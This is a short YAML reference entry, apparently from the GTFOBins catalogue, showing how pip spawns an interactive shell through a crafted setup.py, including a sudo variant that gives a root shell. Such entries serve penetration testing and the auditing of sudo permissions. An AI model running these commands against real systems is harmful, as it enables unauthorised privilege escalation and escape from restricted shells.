---
description: |
  More generally, this allows to execute arbitrary Python code.

  See the entries of Python [version 2](/gtfobins/python2/) and [version 3](/gtfobins/python3/).
functions:
  execute-interactive:
    - code: |
        TF=$(mktemp -d)
        echo 'import os; os.dup2(0, 1); os.dup2(0, 2); os.execl("/bin/sh", "sh")' > $TF/setup.py
        pip install $TF
  sudo-enabled:
    - code: |
        TF=$(mktemp -d)
        echo 'import os; os.dup2(0, 1); os.dup2(0, 2); os.execl("/bin/sh", "sh")' > $TF/setup.py
        sudo pip install $TF
---
